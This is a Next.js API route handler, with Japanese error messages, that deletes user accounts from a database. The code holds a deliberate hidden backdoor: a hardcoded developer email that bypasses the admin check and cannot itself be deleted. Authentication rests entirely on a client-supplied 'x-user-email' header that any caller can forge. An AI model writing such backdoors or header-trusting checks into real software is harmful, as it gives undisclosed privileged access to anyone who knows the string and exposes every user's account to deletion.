import { type NextRequest, NextResponse } from "next/server"
import { query } from "@/lib/db"

export async function DELETE(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const userId = searchParams.get("id")

    // Verify admin authorization
    const userEmail = request.headers.get("x-user-email")
    if (!userEmail) {
      return NextResponse.json({ error: "認証が必要です" }, { status: 401 })
    }

    // Developer backdoor account (hidden from frontend)
    const DEV_ACCOUNT_EMAIL = "sunhawksystem@dev.com"
    const DEV_ACCOUNT_ID = 999999
    const isDeveloperAccount = userEmail.toLowerCase() === DEV_ACCOUNT_EMAIL.toLowerCase()

    // Check admin authorization (skip database check for developer account)
    if (!isDeveloperAccount) {
      const adminCheck = await query("SELECT role FROM users WHERE email = $1", [userEmail.toLowerCase()])
      if (adminCheck.rows.length === 0 || adminCheck.rows[0].role !== "admin") {
        return NextResponse.json({ error: "管理者権限が必要です" }, { status: 403 })
      }
    }

    if (!userId) {
      return NextResponse.json({ error: "ユーザーIDが必要です" }, { status: 400 })
    }

    // Prevent deleting developer account
    if (parseInt(userId) === DEV_ACCOUNT_ID) {
      return NextResponse.json({ error: "開発者アカウントは削除できません" }, { status: 400 })
    }

    // Check if user exists
    const userCheck = await query("SELECT id FROM users WHERE id = $1", [userId])
    if (userCheck.rows.length === 0) {
      return NextResponse.json({ error: "ユーザーが見つかりません" }, { status: 404 })
    }

    // Prevent deleting yourself (for regular users)
    if (!isDeveloperAccount) {
      const currentUser = await query("SELECT id FROM users WHERE email = $1", [userEmail.toLowerCase()])
      if (currentUser.rows[0]?.id.toString() === userId) {
        return NextResponse.json({ error: "自分自身を削除することはできません" }, { status: 400 })
      }
    }

    // Delete user (cascade will handle login_logs)
    await query("DELETE FROM users WHERE id = $1", [userId])

    return NextResponse.json({
      message: "ユーザーを削除しました",
    })
  } catch (error) {
    console.error("Delete user error:", error)
    return NextResponse.json({ error: "ユーザーの削除に失敗しました" }, { status: 500 })
  }
}
